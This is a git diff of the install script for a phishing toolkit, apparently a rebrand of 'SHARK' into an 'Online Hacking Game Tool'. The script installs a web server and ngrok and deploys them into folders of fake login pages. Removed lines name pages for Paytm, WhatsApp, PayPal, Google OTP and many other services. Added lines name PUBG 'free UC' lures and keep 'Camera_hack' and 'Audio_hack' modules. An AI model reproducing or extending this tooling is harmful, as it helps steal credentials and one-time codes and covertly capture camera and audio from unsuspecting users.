@@ -103,14 +103,14 @@ echo
 dependencies
 sleep 4
 
-xterm -T "SHARK © 2020" -geometry 115x35 -e "sudo apt-get update"
-xterm -T "SHARK © 2020" -geometry 115x35 -e "sudo apt-get install apache2 -y"
-xterm -T "SHARK © 2020" -geometry 115x35 -e "sudo apt-get install php -y"
-xterm -T "SHARK © 2020" -geometry 115x35 -e "sudo apt-get install jq -y"
-xterm -T "SHARK © 2020" -geometry 115x35 -e "sudo apt-get install tail -y"
-xterm -T "SHARK © 2020" -geometry 115x35 -e "sudo apt-get install curl -y"
-xterm -T "SHARK © 2020" -geometry 115x35 -e "sudo apt-get install xterm -y"
-xterm -T "SHARK © 2020" -geometry 115x35 -e "sudo apt-get install wget -y"
+xterm -T "SUMAN © 2021" -geometry 115x35 -e "sudo apt-get update"
+xterm -T "SUMAN © 2021" -geometry 115x35 -e "sudo apt-get install apache2 -y"
+xterm -T "SUMAN © 2021" -geometry 115x35 -e "sudo apt-get install php -y"
+xterm -T "SUMAN © 2021" -geometry 115x35 -e "sudo apt-get install jq -y"
+xterm -T "SUMAN © 2021" -geometry 115x35 -e "sudo apt-get install tail -y"
+xterm -T "SUMAN © 2021" -geometry 115x35 -e "sudo apt-get install curl -y"
+xterm -T "SUMAN © 2021" -geometry 115x35 -e "sudo apt-get install xterm -y"
+xterm -T "SUMAN © 2021" -geometry 115x35 -e "sudo apt-get install wget -y"
 clear
 echo
 dependencies
@@ -133,76 +133,13 @@ echo -e "\e[31m[\e[32m~\e[31m]\e[33m Done \e[m "
 sleep 2
 chmod +x ngrok
 chmod +x shark_logo
-cp -R ngrok phs/github/
-cp -R shark_logo phs/github
-cp -R ngrok phs/Hotstar-otp-bypass/
-cp -R shark_logo phs/Hotstar-otp-bypass
-cp -R ngrok phs/instagram/
-cp -R shark_logo phs/instagram
-cp -R ngrok phs/Linkedin/
-cp -R shark_logo phs/Linkedin
-cp -R ngrok phs/Netflix/
-cp -R shark_logo phs/Netflix
-cp -R ngrok phs/Paytm-Phishing/paytm/
-cp -R shark_logo phs/Paytm-Phishing/paytm
-cp -R ngrok phs/Paytm-Phishing/signup/
-cp -R shark_logo phs/Paytm-Phishing/signup
-cp -R ngrok phs/spotify/
-cp -R shark_logo phs/spotify
-cp -R ngrok phs/whatsapp-phishing/
-cp -R shark_logo phs/whatsapp-phishing
-cp -R ngrok phs/facebook/
-cp -R shark_logo phs/facebook
-cp -R ngrok phs/google-otp/
-cp -R shark_logo phs/google-otp
-cp -R ngrok phs/instafollow/
-cp -R shark_logo phs/instafollow
-cp -R ngrok phs/ipfinder/
-cp -R shark_logo phs/ipfinder
-cp -R ngrok phs/ola-otpbypass/
-cp -R shark_logo phs/ola-otpbypass
-cp -R ngrok phs/UberEats-Phishing/
-cp -R shark_logo phs/UberEats-Phishing
-cp -R ngrok phs/Zomato-Phishing/
-cp -R shark_logo phs/Zomato-Phishing
-cp -R ngrok phs/amazonsign/
-cp -R shark_logo phs/amazonsign
-cp -R ngrok phs/phonepay/
-cp -R shark_logo phs/phonepay
-cp -R ngrok phs/paypal/
-cp -R shark_logo phs/paypal
-cp -R ngrok phs/telegram/
-cp -R shark_logo phs/telegram
-cp -R ngrok phs/twitter/
-cp -R shark_logo phs/twitter
-cp -R ngrok phs/flipcart/
-cp -R shark_logo phs/flipcart
-cp -R ngrok phs/wordpress/
-cp -R shark_logo phs/wordpress
-cp -R ngrok phs/snapchat/
-cp -R shark_logo phs/snapchat
-cp -R ngrok phs/protonmail/
-cp -R shark_logo phs/protonmail
-cp -R ngrok phs/stackoverflow/
-cp -R shark_logo phs/stackoverflow
-cp -R ngrok phs/ebay/
-cp -R shark_logo phs/ebay
-cp -R ngrok phs/twitch/
-cp -R shark_logo phs/twitch
-cp -R ngrok phs/ajio/
-cp -R shark_logo phs/ajio
-cp -R ngrok phs/cryptocurrency/
-cp -R shark_logo phs/cryptocurrency
-cp -R ngrok phs/mobikwik/
-cp -R shark_logo phs/mobikwik
-cp -R ngrok phs/pinterest/
-cp -R shark_logo phs/pinterest
+cp -R ngrok phs/Free-UC-Buy-OH/
+cp -R ngrok phs/Lucky-Spin-OH/
+cp -R ngrok phs/BonusChallenge-Free-Gift-OH/
 cp -R ngrok phs/Camera_hack
 cp -R shark_logo phs/Camera_hack
 cp -R shark_logo phs/Audio_hack
 cp -R ngrok phs/Audio_hack
-
-
 clear
 echo 
 echo 
@@ -218,18 +155,18 @@ sleep 1
 clear
 echo
 echo
-echo -e "\e[92m[+] Setting up shark \e[m "
+echo -e "\e[92m[+] Setting up Online Hacking Game Tool \e[m "
 echo 
 rm setup
 rm shark
 mv kali-setup setup 
 mv kali-shark shark
 cp -R phs /usr/bin
-cp -R shark /usr/bin
+cp -R onlinehacking_pubg /usr/bin
 ###########XXXXXXXXXXXXX####################
 #     JUST LEARNING KEEP SUPPORTING        #
 ############XXXXXXXXXXXX####################
-echo -e "\e[92m[+] To run the tool from anywhere simply type : shark \e[m "
+echo -e "\e[92m[+] To run the tool from anywhere simply type : onlinehacking_pubg \e[m "
 echo 
 exit
 #####################################
